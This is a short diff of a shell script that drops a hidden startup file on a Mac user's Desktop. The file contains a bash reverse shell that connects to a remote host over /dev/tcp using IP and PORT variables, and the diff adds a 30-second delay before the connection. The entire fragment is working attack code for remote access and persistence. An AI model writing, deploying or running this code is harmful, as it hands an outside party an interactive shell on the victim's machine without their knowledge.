@@ -3,6 +3,7 @@
 USR=$(whoami)
 
 echo "#!/bin/bash
+sleep 30
 bash -c 'exec bash -i &>/dev/tcp/$IP/$PORT <&1 &'
 " > /Users/$USR/Desktop/.runonstartupMACOS.sh
 
